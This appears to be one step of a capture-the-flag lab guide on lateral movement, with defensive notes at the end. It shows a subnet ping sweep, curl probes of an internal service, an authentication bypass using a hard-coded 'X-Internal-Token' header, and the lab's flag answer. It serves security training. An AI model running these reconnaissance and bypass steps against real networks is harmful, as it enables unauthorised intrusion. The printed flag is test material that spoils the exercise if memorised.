# 04 — Lateral Movement

**Objective:** Move from the public web container to the internal service that is not directly accessible.

## Skills practiced

- Container network pivoting
- Identifying internal services via DNS and subnet scanning
- Exploiting broken authentication on an internal API

## Steps

1. From a shell on the web container, discover the internal network:
   ```bash
   cat /etc/hosts
   env | grep -i host
   # Scan internal subnet
   for i in $(seq 1 254); do ping -c1 -W1 10.10.1.$i &>/dev/null && echo "10.10.1.$i up"; done
   ```

2. Probe the internal service:
   ```bash
   curl http://forge-internal:9090/
   curl http://forge-internal:9090/health
   ```

3. Exploit broken auth to retrieve the flag:
   ```bash
   # Try bypass token documented in the source
   curl -H "X-Internal-Token: lab-bypass" http://forge-internal:9090/secret
   ```

## Flags

- `FLAG{lateral_move_success}` — returned by `/secret`

## Defensive notes

- Enforce network segmentation so internal services are unreachable even from other internal containers by default
- Never include bypass tokens in source code
- Validate tokens against a proper secrets store
